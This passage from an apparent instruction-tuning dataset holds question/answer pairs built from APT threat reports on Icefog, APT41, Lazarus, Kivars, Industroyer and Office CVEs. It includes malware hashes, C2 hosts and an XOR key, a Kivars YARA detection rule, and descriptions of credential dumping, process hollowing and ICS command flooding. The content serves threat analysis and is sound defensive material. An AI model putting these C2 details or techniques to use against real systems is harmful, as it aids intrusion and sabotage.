malicious code from the disk.\nOverall, this malware was observed to send information about the computer and set up a backdoor for remote access. This backdoor provides the attacker the flexibility on how malicious activities could be executed.\n\nIn the context of the Trojan.APT.BaneChant report, explain how the malware's use of a legitimate URL shortening service enhances its evasion capabilities and what challenges this poses for automated blocking technologies?",
    "output": "A: The Trojan.APT.BaneChant malware uses a legitimate URL shortening service for its callback, which then redirects the communication to the Command and Control (CnC) server. This technique enhances its evasion capabilities because automated blocking technologies typically focus on blocking known malicious URLs. By using a legitimate service, the malware can bypass these initial defenses. Moreover, if the URL shortening service is blocked, it does not directly affect the CnC server, making it harder for defenders to trace and block the actual source of the malicious activity. This approach adds a layer of obfuscation, complicating the efforts of security systems to identify and mitigate the threat effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Describe the process through which the Icefog backdoor communicates with its Command and Control (C&C) server. What specific information is collected and how is it transmitted?",
    "output": "The Icefog backdoor communicates with its C&C server through a spawned thread that collects system information such as user names, machine names, IP addresses, running processes, proxy settings, Windows versions, etc. This information is written to a temporary file (%TMP%\\tmp.dat), encrypted using XOR with the key '*&~^%@0hh8979', and then sent via an HTTP/1.1 POST request to 'icefog.8.100911.com' on port 80. The full query string is '/news/upload.aspx?filepath=info&filename=<HOSTNAME>_<HOSTIP>.jpg', with specific HTTP headers including Host, User-Agent, Accept, Accept-Language, Content-Type, Accept-Encoding, Connection, and Cache-Control.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the implications of APT41's use of the same tools and compromised digital certificates as other Chinese espionage operators? How does this overlap affect the attribution of cyber attacks?",
    "output": "The implications of APT41's use of the same tools and compromised digital certificates as other Chinese espionage operators are significant because it leads to conflation across multiple distinct espionage operations. This overlap makes it difficult to attribute specific attacks to a single group, as seen with the use of HIGHNOON and its variants. It highlights the need for a nuanced understanding of shared resources and collaborations among different Chinese cyber espionage groups.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Blackfly: Espionage Group Targets Materials Technology\nThe Blackfly espionage group (aka APT41, Winnti Group, Bronze Atlas) has continued to mount attacks against targets in Asia and recently targeted two subsidiaries of an Asian conglomerate, both of which operate in the materials and composites sector, suggesting that the group may be attempting to steal intellectual property.\nCurrent Blackfly toolset\nThe following tools were used in attacks during late 2022 and early 2023:\nBackdoor.Winnkit\nSHA256: caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459\nSHA256: cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a\nSHA256: e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596\nSHA256: a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac\nSHA256: 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196\nSHA256: 192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284\nRootkit driver known to be associated with Blackfly\nCredential-dumping tool\nSHA256: 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c Creates a dump of credentials from lsass.exe in C:\\windows\\temp\\1.bin.\nScreenshotting tool\nSHA256: 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4 Screenshots all open windows and saves them as .jpg files.\nProcess-hollowing tool\nSHA256: 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e Injects shellcode in C:\\Windows\\system32\\svchost.exe -k\nLocalSystemNetworkRestricted. The shellcode is a simple \"Hello World\" alert message.\nSQL tool\nSHA256: 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d SQL client tool used to query SQL databases.\nAnswer this question: How does the Blackfly espionage group utilize its current toolset to achieve its objectives, particularly in the context of targeting the materials and composites sector? Discuss the specific tools mentioned and their functions.",
    "output": "The Blackfly espionage group (also known as APT41, Winnti Group, Bronze Atlas) employs a diverse set of tools to carry out its attacks, especially when targeting entities in the materials and composites sector. The toolset includes several backdoors identified by their SHA256 hashes, which are likely used to maintain persistent access to compromised systems. Additionally, they use a rootkit driver to hide their activities from detection. Credential-dumping tools, such as one that extracts credentials from lsass.exe and saves them in C:\\\\windows\\\\temp\\\\1.bin, are utilized to gather sensitive information. Another tool captures screenshots of all open windows and saves them as .jpg files, potentially for reconnaissance or data exfiltration purposes. A process-hollowing tool injects shellcode into svchost.exe, which could be used to execute malicious code under the guise of legitimate system processes. Lastly, an SQL tool is employed to query SQL databases, indicating an interest in accessing and possibly exfiltrating database contents. These tools collectively enable Blackfly to infiltrate systems, gather intelligence, and potentially steal intellectual property from their targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Other Known Operations\nThe attack on European financial institutions was implemented via a watering hole, a compromised government website that had many regular visitors from local banks. However, the same approach has been used in multiple other places around the world. The Polish waterhole incident got much more public attention than the others due to the escalation of the alert to a higher level and the compromise of a government website.\nWe have seen a few other websites being compromised with the same symptoms and turned into a watering hole through script injection or by placing exploit delivery code. We have found them in the following countries:\n\u25cf Russian Federation\n\u25cf Australia\n\u25cf Uruguay\n\u25cf Mexico\n\u25cf India\n\u25cf Nigeria\n\u25cf Peru\nWhat connected most of the compromised websites was the JBoss application server platform. This suggests that attackers may have an exploit for the JBoss server. Unfortunately we haven't managed to find the exploit code yet. Nevertheless, we would like to recommend to all JBoss application server administrators that they limit unnecessary access to their servers and check the access logs for attack attempts.\nBanks were not the only Lazarus Group targets. This suggests that it has multiple objectives. We have seen some unusual victims, probably overlapping with the wider Lazarus Group operations, i.e. a cryptocurrency business. When it comes to Bluenoroff, its typical list of targets includes banks, financial and trading companies, casinos and cryptocurrency businesses.\nDetections of Lazarus/Bluenoroff malware are also distributed across the world. Here are some:\nRead the text above and answer this question: How did the Lazarus Group leverage watering hole attacks in their operations, and what specific platform vulnerability might they have exploited? Additionally, discuss the broader range of targets beyond financial institutions that the Lazarus Group has focused on.",
    "output": "The Lazarus Group implemented watering hole attacks by compromising legitimate websites frequently visited by their intended targets, such as local banks. One notable example is the Polish waterhole incident, where a government website was compromised. This technique was replicated in various countries, including the Russian Federation, Australia, Uruguay, Mexico, India, Nigeria, and Peru. The commonality among these compromised websites was the use of the JBoss application server platform, suggesting that the attackers might possess an exploit for this server. Although the exact exploit code hasn't been identified, it is recommended that JBoss administrators restrict unnecessary access and monitor access logs for potential attacks.\\n\\nBeyond financial institutions, the Lazarus Group has targeted a diverse range of entities, indicating multiple objectives. Some unusual victims include cryptocurrency businesses, which overlap with the broader operations of the Lazarus Group. Specifically, Bluenoroff, a subset of the Lazarus Group, typically targets banks, financial and trading companies, casinos, and cryptocurrency businesses.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Targeted Exploitation #3: Asian Press, Kivars Keylogger Payload\nOn Jan 2, 2016 a\t\n  spearphish mail was sent\t\n  to the target.\nThe \t\n  subject\t\n  for this message is \"[BULK] TIBET, OUR\t\n  BELOVED NATION AND WILL NEVER\t\n  FORGET IT.\" In this case, the actors have embedded the malware inside a\t\n  RAR\t\n  file and have positioned the RAR file as needing translation. It\t\n  is not\t\n  known how common it\t\n  may be for authors to use the RAR\t\n  format\t\n  in such a\t\n  case, however it\t\n  does appear to be suspicious.\nThe \t\n  specific\t\n  target\t\n  in this case appears to\t\n  be an individual working with a\t\n  media\t\n  and publications press in Hong Kong. The company associated with this individual has been reported to be heavily influenced by the Chinese Government.\nThe RAR archive contains a\t\n  file named \"brochure. doc\" (note the space) which \t\n  is actually an RTF. Opening brochure .doc in a\t\n  vulnerable environment\t\n  (Windows\t\n  7, Office 2013, unpatched) results in the display of a\t\n  file that\t\n  appears to be corrupted and/or composed \t\n  of\t\n  garbage characters, as observed on the left.\nTriggering of the final payload results in a\t\n \u00a0TCP connection to 103.240.203[.]232:8080. This IP address is located in Hong Kong (in-\u00ad\u2010country to the target).\t\n \u00a0When the malware initiates an outbound connection to the server, the server responds with the following data:\nThis information may be useful for network-\u00ad\u2010based detection.\nDuring analysis, several files were created during the exploitation, including tnyjs.dll, uhfx.dat, uhfx.dll, and yxsrhsxhxdbldkc.dat. These were created in the Windows/System32 folder.\nAttempting to open one of the DLL's in IDA Pro resulted in a\t\n \u00a0helpful\t\n \u00a0pop-\u00ad\u2010up\t\n \u00a0message that reveals a\t\n \u00a0PDB string that\t\n \u00a0correlates this sample with instances of the Kivars keylogger [22]. The PDB string is\t\n \u00a0Q:\\Projects\\Br2012\\Release\\svc.pdb.\t\n \u00a0Analysis of this DLL sample reveals that\t\n \u00a0it\t\n \u00a0is designed to run as a\t\n \u00a0service, which matches the design of Kivars.\nMedium Headline: Connections to Historical and Ongoing Threat Campaign Activity: Shrouded Crossbow\nSeveral additional samples of the Kivars malware were discovered that\t\n  might have an overlap with this particular campaign. The overlap is circumstantial, since the only common elements we have are the use of Kivars itself, and C2 infrastructure also being geolocated in Hong\t\n  Kong. Kivars appears to be somewhat\t\n  rare, with only a\t\n  limited amount\t\n  of samples appearing in the ASERT malware analysis repository. It\t\n  is currently unknown if the malware family is closely held, or shared among numerous actor groups.\nPivoting on the import\t\n \u00a0hash value of the malware payload reveals a\t\n \u00a0potentially related sample, an unnamed keylogger malware analyzed by ASERT on\t\n \u00a01-\u00ad\u201020-\u00ad\u20102016\t\n \u00a0with an MD5 of a0dc5723d3e20e93b48a960b31c984c0 and a\t\n \u00a0SHA-\u00ad\u2010256 hash of 185fc01ec8adbaa94da741c4c1cf1b83185ae63899f14ce9949553c5dac3ecf6.\t\n \u00a0This\t\n \u00a0sample connected to the same C2 -\u00ad\u2010 akm.epac[.]to on TCP/8088, resolving at\t\n \u00a0analysis time as 103.240.203[.]232, an IP address in Hong Kong. The domain akm.epac[.]to began resolving to this IP address on January 2, 2016 and the domain gugehotel[.]cn began resolving to this IP address on February 23, 2016 and continues to resolve as of this writing on March 16, 2016.\nThe gugehotel domain also shows\t\n \u00a0resolution activity between 11-\u00ad\u20107-\u00ad\u20102014 and 6-\u00ad\u20109-\u00ad\u20102015 to the IP address 107.183.86[.] that\t\n \u00a0reveal a\t\n \u00a0large number of passive DNS resolutions (570), which likely disqualifies the IP address for follow-\u00ad\u2010up research. It\t\n \u00a0is potentially interesting to note however that\t\n \u00a0many of the passive DNS resolutions for this domain have the suffix domain cos-\u00ad\u2010china.com. This may be related to the China\t\n \u00a0Operating System (COS) which is a\t\n \u00a0Chinese-\u00ad\u2010based operating system designed to compete with iOS and Android [23].\nPivoting on aspects of this sample returns other potentially interesting samples:\n\u2022 MD5 937c13f5915a103aec8d28bdec7cc769 uses a\t\n  C2 of 203.160.247[.]21:443\no ASN\t\n \u00a010126 | 203.160.247.21 | TW | CHTI-\u00ad\u2010IP-\u00ad\u2010AP Taiwan Internet\t\n \u00a0Gateway,TW\no This C2 IP address is also found in a\t\n \u00a0Kivars service binary (MD5: 19b2ed8ab09a43151c9951ff0432a861,\t\n \u00a0SHA-\u00ad\u2010256:\t\n \u00a09d69221584a5c6f8147479282eae3017c2884ae5138d3b910c36a2a38039c776)\n\u2022 MD5: b2ae8c02163dcee142afe71188914321 \u2013 uses\t\n  wins.microsoftmse[.]com for \t\n  C2.\no This sample was submitted to Virus Total in October of 2014 from Taiwan.\nSamples discovered so far are triggering an AV detection of Kivars, which has been written about\t\n  by Trend in 2014 [24].\nOne particular sample first\t\n  submitted to Virus Total in 2013 and discovered via\t\n  a\t\n  Yara\t\n  retrohunt, has the following properties:\nMD5:\t\n  0566703ccda6c60816ef1d8d917aa7b0\nSHA-\u00ad\u2010256:\t\n \u00a0766e0c75bb13986f6a18f9f6af422dbda8c6717becc9b02cc4046943a960d21f\nThis sample once connected to adc.microsoftmse[.]com\t\n \u00a0(122.10.9[.]121),\t\n \u00a0resolving to an IP address in Hong Kong. This resolution only appears to have taken place on 7-\u00ad\u20106-\u00ad\u20102013 and was associated with the bifrose Trojan and also correlates with Shrouded Crossbow activity. Numerous other domains resolving to this IP were also observed to be part\t\n \u00a0of Shrouded Crossbow infrastructure.\t\n \u00a0The domain microsoftmse[.]com currently points to Microsoft\t\n \u00a0address space, but\t\n \u00a0was used by threat\t\n \u00a0actors in the past.\nFurther details on Operation Shrouded Crossbow were published by Trend Micro in December of 2015 [22] and reveals the use of the Bifrose and Kivars Trojans and the relationship between the two \u2013 Kivars appears to have re-\u00ad\u2010used\t\n \u00a0at\t\n \u00a0least\t\n \u00a0some parts of the Bifrose code. [25]\nSubmitting one of the DLL's to Virus Total results in predictable scan results, and pivoting on the import\t\n  hash results in the discovery of several more samples of the Kivars service.\t\n  Scanning Virus Total indicates numerous recent\t\n  detections of Kivars. Many of the discovered Kivars service files have been submitted in January and February of 2016, indicating a\t\n  new wave of activity and/or detection.\nA YARA rule to detect\t\n  instances of Kivars running as a\t\n  service is included herein. Service files are distinct\t\n  and can be analyzed directly, but\t\n  scanning of memory could also be useful in the event\t\n  that\t\n  Kivars becomes more highly obfuscated.\nrule kivars_service {\nmeta:\ndescription\t\n  = \"Detects instances of Kivars malware when installed as a service\" author =\t\n  \"cwilson@arbor.net\"\nSHA-\u00ad\u2010256\t\n \u00a0=\t\n \u00a0\"443d24d719dec79a2e1be682943795b617064d86f2ebaec7975978f0b1f6950d\"\nSHA-\u00ad\u2010256\t\n \u00a0=\t\n \u00a0\"44439e2ae675c548ad193aa67baa8e6abff5cc60c8a4c843a5c9f0c13ffec2d8\"\nSHA-\u00ad\u2010256\t\n \u00a0=\t\n \u00a0\"74ed059519573a393aa7562e2a2afaf046cf872ea51f708a22b58b85c98718a8\"\nSHA-\u00ad\u2010256\t\n \u00a0=\t\n \u00a0\"80748362762996d4b23f8d4e55d2ef8ca2689b84cc0b5984f420afbb73acad1f\"\nSHA-\u00ad\u2010256\t\n \u00a0=\t\n \u00a0\"9ba14273bfdd4a4b192c625d900b29e1fc3c8673154d3b4c4c3202109e918c8d\"\nSHA-\u00ad\u2010256\t\n \u00a0=\t\n \u00a0\"fba3cd920165b47cb39f3c970b8157b4e776cc062c74579a252d8dd2874b2e6b\"\nstrings:\n$s1\t\n  =\t\n  \"\\\\Projects\\\\Br2012\\\\Release\\\\svc.pdb\"\n$s2\t\n  =\t\n  \"This is a\t\n  flag\"\n$s3\t\n  =\t\n  \"svc.dll\"\n$s4\t\n  =\t\n  \"ServiceMain\"\n$s5\t\n  =\t\n  \"winsta0\"\ncondition:\nuint16(0) == 0x5A4D and\t\n  filesize < 1000000 and (all of ($s*))\n}\nInterestingly, all of these Kivars service files listed in the YARA rule have the same compilation date of 2013-\u00ad\u201011-\u00ad\u201020@00:26:30. Some AV detection that\t\n \u00a0appears to be reasonably accurate includes BKDR_KIVARS.SMV0 (Trend) and Win32/Agent.XUI\t\n \u00a0Trojan (ESET).\nBig Headline: Targeted Exploitation #4: 64 Bit Kivars Keylogger\nTargeting is not\t\n \u00a0available for this sample, however it\t\n \u00a0was first\t\n \u00a0uploaded to VT from Korea and first\t\n \u00a0observed by ASERT on January 2, 2016.\t\n \u00a0A\t\n \u00a064-\u00ad\u2010bit instance of the Kivars malware is dropped from this exploitation into the AppData/Local/Temp directory with a\t\n \u00a0.tmp file extension. The bait/distraction document\t\n \u00a0displayed is very similar to the document\t\n \u00a0observed in the previously discussed Kivars sample:\nThe RTF file contains the following metadata:\nThe date of 12/30/2015 is fairly close to the timeframe observed within other malware sample and spearphish metadata. The author and last\t\n  modified value is \"xxx\" which was not\t\n  observed again while analyzing malware samples for this report.\nTrend Micro profiled the 64-\u00ad\u2010bit\t\n \u00a0version of Kivars in\t\n \u00a02014 [25]. This\t\n \u00a0version\t\n \u00a0will not\t\n \u00a0execute in a\t\n \u00a032-\u00ad\u2010bit environment, therefore it\t\n \u00a0is possible that\t\n \u00a0additional targeting occurred in order to scope the victim machine.\nIf compilation dates were not\t\n  faked, this sample was compiled back in November of 2013.\n\nWhat files were created during the exploitation process in Targeted Exploitation #3? How were these files identified as part of the Kivars keylogger?",
    "output": "Several files were created during the exploitation, including tnyjs.dll, uhfx.dat, uhfx.dll, and yxsrhsxhxdbldkc.dat, all located in the Windows/System32 folder. Attempting to open one of the DLLs in IDA Pro revealed a PDB string 'Q:\\\\Projects\\\\Br2012\\\\Release\\\\svc.pdb', which correlates this sample with instances of the Kivars keylogger. Analysis of the DLL sample confirmed it was designed to run as a service, matching the design of Kivars.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 104 payload component\nThis payload DLL has the filename 104 dll and is named after IEC 104 (aka ), an international standard  The IEC 104 protocol extends IEC 101, so the protocol can be transmitted over a TCP/IP network\nDue to its highly configurable nature, this payload can be customized by the attackers for different infrastructures  Figure 8 shows what a configuration file may look like\nOnce executed, the 104 payload DLL attempts to read its configuration file As described above, the path for the configuration file is supplied by the Launcher component\nThe configuration contains a STATION section followed by properties that configure how the 104 payload should work  The configuration may contain multiple STATION entries\nOur analysis of this component reveals the following possible configuration properties:\nOnce the configuration file is read, the 104 payload creates a thread for each STATION section defined in the configuration file  In each such thread, the 104 payload will attempt to communicate with the specified IP address using the protocol described in the IEC 104 standard  Before the connection is made, the 104 payload attempts to terminate the legitimate process that is normally responsible for IEC 104 communication with the device  It does so only if the stop_comm_service property is specified in its configuration  By default, the 104 payload terminates the process named D2MultiCommService.exe, or the process name specified in its configuration\nThe main idea behind the 104 payload is relatively simple  It connects to the specified IP address and starts to send packets with the ASDU address that was defined in its configuration  The goal of this communication is to interact with an IOA of a single command type\nIn the configuration file, the attacker can define the operation property to specify exactly how single command type IOAs will be iterated\nThe first such operation mode is the range mode  The attackers use this mode in order to discover possible IOAs in the targeted device  The attackers have to take this approach because the protocol described in the IEC 104 standard does not provide a specific method to obtain such information\nThe range mode has two stages  During the first stage, once the range of IOAs is obtained from the configuration file, the 104 payload connects to the target IP address and starts to iterate through the specified IOAs  To each such IOA the 104 payload sends \"select and execute\" packets in order to switch the state and to confirm whether the IOA belongs to the single command type\nOnce all possible IOAs from the specified range are iterated, the 104 payload switches to the second stage of range mode  If logging is enabled, the payload writes Starting only success to the log  The rest of this second stage is an infinite loop that uses the previously discovered IOAs of single command type  In the loop the payload constantly sends \"select and execute\" packets  In addition, if the option change is defined, the payload flips the On/Off state between loop steps\nFigure 10 demonstrates the log file that was produced by the 104 payload during our analysis  It shows the payload iterated IOAs from 10 to 15, and once IOAs of the single command type were discovered, the payload started to use them in the loop  The configuration had the change option\nenabled, so between loop iterations the payload flipped the switch value from On to Off and wrote it to the log\nThe second operation mode is the shift mode  This is very similar to the range mode  The attacker defines, in the configuration file, a range of IOAs and shift values  Once the 104 payload is activated it does everything the same way as in range mode; however, once all IOAs in the defined range are iterated, it starts to iterate over the new range  The new range is calculated by adding the shift values to the default range values\nThe third operation mode is the sequence mode  It can be used by attackers once they know the values of all IOAs of the single command type that are supported by the connected device  This payload immediately\nexecutes an infinite loop, sending \"select and execute\" packets to the IOAs defined in the configuration file\nAside from its logging capability, the 104 payload can output debug information to the console, as seen in Figure 11\n\nHow does the 104 payload component of Win32/Industroyer interact with industrial control systems, and what are the different operation modes it employs?",
    "output": "The 104 payload component of Win32/Industroyer interacts with industrial control systems by connecting to a specified IP address and sending packets with the ASDU address defined in its configuration. The goal is to interact with an Information Object Address (IOA) of a single command type. The payload supports three operation modes: range mode, shift mode, and sequence mode. In range mode, the payload iterates through a specified range of IOAs to discover those of the single command type and then enters an infinite loop to send 'select and execute' packets, potentially flipping the On/Off state. Shift mode is similar but iterates over a new range calculated by adding shift values to the default range. Sequence mode is used when the attacker already knows the values of all IOAs of the single command type and immediately executes an infinite loop, sending 'select and execute' packets to the defined IOAs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Timeline of Events\nOne of the first priorities is to outline a timeline of events which have occurred and then examine what significance they may have or relationships they may share in order to scope the conversation. These events will constitute the frame for the analysis. Events were chosen after a preliminary overview of content from open sources such as established news media sites, oil & gas company websites, Google query results, government bulletins, and technical reports by security companies. From this brief overview, events within the Oil and Gas Industry which exhibited a \"cyber\" component were selected. These events are not meant to be all inclusive, and due to the entirely open source nature of the resources, the vantage point on the information may be biased and in many instances is likely incomplete. However even an incomplete view may contain enough information to identify significant patterns, and by acknowledging the quality concerns with the information, a more accurate and objective analysis may be performed. Below is a timeline of observed events which will be discussed in greater detail. The timeline will list the event and the apparent target of the event.\nTimeline & Details of Sampled Events\n1 Sophisticated infection and data exfiltrationin Iraq of corporate secrets suspected to be part of the Night Dragon campaign\n2 Earliest known intrusion of Shady RAT in the Gas industry\u2013sophisticated infection and data exfiltration of corporate secrets\n3 A disgrunted former contractor for PER intentionally disables offshore oil rig safety controls remotely off the coast of California\n4 McAfee starts monitoring the Night Dragon cyber espionage campaign against oil, energy, and petrochemical companies\n5 Symantec ties back a Google hack to a campaign referred to as the Elderwood Project that targets Oil/Gas targets amongst others\n6 Deepwater Horizon Oil Rig suffers catastrophic failure; Control safety Systems had been rendered inhibited\n7 BG Group Plc and CHK. are alleged to be victim of sophisticated data exfiltration of corporate secrets reported by Bloomberg\n8 Talisman Energy & Halliburton Co. are targeted by the comment group as part of a corporate espionage campaign\n9 Sophisticated infection and data exfiltration of corporate secrets from unspecified oil & gas companies in Norway\n10 Virus infects a series control systems on Kharg Island, Iran's main oil exportation station, causing them to shut down the terminals\n11 Dell's Counter Threat Unit begins tracking the Mirage cyber espionage campaign\u2014Sophisticated data exfiltration of corporate secrets\n12 Anonymous hackers target oil industry giants, exposing more than 1,000 email credentials\n13 Shamoon virus systematically exfiltrates corporate data and wiped hard drives of over 30,000 computers at Saudi's Aramco\n14 Sophisticated infection and data exfiltration of corporate secrets from Telvent, ltd.\n15 Virus infects a series control systems on Kharg Island, Iran's main oil exportation station, causing them to shut down the terminals\n16 Anonymous announces their intent to attack international oil companies in \"#OpFuelStrike\"\n17 Kaspersky announces Red October, a highly flexible cyber espionage virus which targets, amongst others, global oil & gas companies\n18 Mandiant releases a document entitled APT1 which implicates China's PLA sponsored espionage, including within the Oil Industry\nGiven this data set, a natural escalation of events appears to occur, with the frequency of incidents continuing to rise. This can partially be explained by a growing international awareness of the vulnerabilities and perils involved in internet-facing control systems of all kinds; as events occur, they garner additional attention and therefore induce additional incidents.\nHowever, there are other interesting observations to be made from this data. Largely, the incidents of great note have occurred in either North America or the Middle East. When considering that three of the top five oil producing countries are in these regions (Saudi Arabia, the United States, and Iran), this is not surprising. Yet substantive reports of similar incidents are markedly absent in the other two of the top five oil producing countries (China and Russia), and this is noteworthy. The argument could be made that this is due to language barriers and tight control on information dissemination, but it is improbable that a significant incident would have gone entirely unnoticed by all media outlets. As the incidents themselves make apparent, human threat actors are involved, and what remains to be identified is whether there is the complexity, overarching coordination, or recurring threat source that would point to an advanced threat such as a state actor or complex non-state actor.\nBefore continuing with the possible attribution of events, some base discussion and criteria for the threat sources must be established. A threat source is considered to be a human-based or natural entity which possesses a capability that aligns with an unmitigated vulnerability. The threat sources which will be considered must meet the minimum requirement of having both the motive and the means to carry out the attack. Once a hypothesis consisting of these elements is established, it will be scrutinized to determine whether or not the events surrounding the incident or series of incidents align in any obvious political, strategic, operational and tactical manner. The means in this case consists of both the opportunity and the technological capability to cause the incident to occur, and the motives that will be considered are economic gain, retribution, or political agenda (to include ideology).\nThe US Army notes in their Cyber Concept & Capabilities plan for 2016-2028 that cyber capabilities pose a unique and attractive opportunity to an inferior, asymmetric enemy to temporarily gain equivalence with a superior enemy because of its relatively low initial cost, high return on investment, and plausible deniability due to issues with attribution. Because of this fact, it is highly likely that multiple foreign agencies as well as powerful corporate denizens have used and continue to make use of cyber capabilities to affect favorable outcomes. The rest of the report will attempt to substantiate this claim through critical analysis.\nQuestion: Why might cyber capabilities be particularly attractive to an inferior, asymmetric enemy, and how does this relate to the Night Dragon campaign and other cyber incidents in the oil and gas industry?",
    "output": "Answer: Cyber capabilities are attractive to an inferior, asymmetric enemy because they offer a unique opportunity to temporarily gain equivalence with a superior enemy. This is due to their relatively low initial cost, high return on investment, and plausible deniability due to issues with attribution. The US Army's Cyber Concept & Capabilities plan for 2016-2028 highlights this attractiveness. In the context of the Night Dragon campaign and other cyber incidents in the oil and gas industry, it is highly likely that multiple foreign agencies and powerful corporate entities have used and continue to use cyber capabilities to achieve favorable outcomes. This underscores the need for critical analysis to substantiate such claims and understand the motivations behind these attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Vulnerabilities: CVE-\u00ad\u20102012-\u00ad\u20100158, CVE-\u00ad\u20102012-\u00ad\u20101856, CVE-\u00ad\u20102015-\u00ad\u20101641, CVE-\u00ad\u20102015-\u00ad\u20101770\nThe Four Element\t\n  Sword\t\n  builder has been observed to utilize exploit\t\n  code against\t\n  four distinct vulnerabilities. Each malicious document\t\n  created by the builder appears to leverage three or \t\n  four of these vulnerabilities in the same RTF document, given a\t\n  .DOC extension. Some targets may warrant\t\n  the use of newer exploit\t\n  code, while others running on dated equipment\t\n  and operating systems may still fall victim to the older exploits. Actors will typically only use the amount\t\n  of force necessary to accomplish their actions on objectives and will not\t\n  typically burn 0day exploit\t\n  code or the most\t\n  advanced techniques against\t\n  targets that\t\n  do not\t\n  require them.\n1. CVE-\u00ad\u20102012-\u00ad\u20100158:\t\n \u00a0This is a\t\n \u00a0vulnerability affecting the ListView, ListView2, TreeView, and TreeView2 ActiveX\t\n \u00a0controls in MSCOMCTL.OCX\t\n \u00a0in the Common Controls of various versions of Office and other software. CVE-\u00ad\u20102012-\u00ad\u20100158 continues to be an extremely popular vulnerability, used by various threat actors for years. A\t\n \u00a0review\t\n \u00a0of Virus Total reveals activity as early as November of 2010, with over 1000 distinct\t\n \u00a0file submissions. The fact\t\n \u00a0that\t\n \u00a0this exploit\t\n \u00a0continues to be bundled into contemporary campaigns is a\t\n \u00a0testament\t\n \u00a0to its longevity, although actors have incorporated more recent\t\n \u00a0CVEs into their toolkits since targets are likely patching older vulnerabilities either by system replacement\t\n \u00a0or through ongoing maintenance. The first\t\n \u00a0public mention of this CVE being used in targeted exploitation campaigns was on\t\n \u00a0April\t\n \u00a016, \t\n \u00a02012 [3] with additional research published on April 19, 2012 [4]. Both of those campaigns demonstrate targeting of the Tibetan community and also reveal an interest\t\n \u00a0in the South China\t\n \u00a0Sea. While early actors apparently developed their own exploit\t\n \u00a0code, publicly available exploit\t\n \u00a0code for this has been present\t\n \u00a0in the Metasploit\t\n \u00a0Framework since April 23, 2012, allowing any actor since then easy access to leverage this vulnerability for their own purposes.\n2. CVE-\u00ad\u20102012-\u00ad\u20101856:\t\n \u00a0This\t\n \u00a0is\t\n \u00a0vulnerability in\t\n \u00a0the TabStrip ActiveX\t\n \u00a0control in the Common Controls of MSCOMCTL.OCX and affects various versions of Office and other software. This vulnerability has also been\t\n \u00a0used in various targeted threat\t\n \u00a0campaigns, although it\t\n \u00a0is detected less often than CVE-\u00ad\u20102012-\u00ad\u20100158. Virus Total reveals 85 instances of this exploit\t\n \u00a0code in February of 2016, with the first\t\n \u00a0submission in September of 2013, one submission a\t\n \u00a0year later in September 2014, and then a\t\n \u00a0substantial increase in activity starting in April of 2015. As of March 30, 2016, Virus Total reveals 353 instances of exploit\t\n \u00a0code\t\n \u00a0for\t\n \u00a0CVE-\u00ad\u20102012-\u00ad\u20101856, indicating a\t\n \u00a0substantial increase in activity and/or detection. Malicious documents containing a\t\n \u00a0combination of exploit\t\n \u00a0code for CVE-\u00ad\u20102012-\u00ad\u20100158 and CVE-\u00ad\u20102012-\u00ad\u20101856\t\n \u00a0were\t\n \u00a0observed as early as October of 2012,\t\n \u00a0however customers of VUPEN, an offensive security company, were aware of this vulnerability since September of 2010 [5], although public disclosure was not\t\n \u00a0made until August\t\n \u00a0of 2012 \u2013 nearly two years later when Microsoft\t\n \u00a0patched the bug with MS12-\u00ad\u2010060.\n3. CVE-\u00ad\u20102015-\u00ad\u20101641:\t\n \u00a0The vulnerability involves the parsing of crafted RTF documents affecting a\t\n \u00a0variety of versions of Office. Virus Total contains 130 instances of exploit\t\n \u00a0code for this vulnerability, with the first\t\n \u00a0submission from August\t\n \u00a0of 2015. Seven instances of this vulnerability appear in specific e-\u00ad\u2010mail files beginning in\t\n \u00a0at\t\n \u00a0least\t\n \u00a0November of 2015. Several of these e-\u00ad\u2010mail messages appear to be generated by actors interested in commercial and financial system compromise. An exploit\t\n \u00a0for this vulnerability was being sold in the wild for $2000 in Mid-\u00ad\u2010July\t\n \u00a0of\t\n \u00a02015 [6] and was posted to YouTube on July 22, 2015 [7].\nThe individuals selling the exploit\t\n \u00a0code at\t\n \u00a0the time appear to be associated with cybercrime operations rather than APT nation-\u00ad\u2010state targeted threats. Shortly thereafter, Sophos wrote about\t\n \u00a0malicious documents appearing in the wild [8] and most\t\n \u00a0of the examples they discuss appear to be related to financial threat\t\n \u00a0campaigns, such as a\t\n \u00a0possible exploitation campaign dealing with Point\t\n \u00a0of Sale systems. Later, in December of 2015, the Microsoft\t\n \u00a0Word Intruder (MWI) crimeware kit\t\n \u00a0incorporated CVE-\u00ad\u20102015-\u00ad\u20101641 into its arsenal of exploit\t\n \u00a0code [9]. In any event, easy access to exploit\t\n \u00a0code in the underground allows targeted threat\t\n \u00a0actors the means to easily and inexpensively obtain the code for their own use. In some cases in the past, dynamics of the exploit\t\n \u00a0food chain has meant\t\n \u00a0that\t\n \u00a0exploits have migrated from advanced threat\t\n \u00a0actors to cybercriminals, however they can also migrate the other direction depending upon the situation at\t\n \u00a0hand. This exploit\t\n \u00a0has gotten more popular and/or detected more frequently since this research was initiated started. As of March 30, 2016, 453 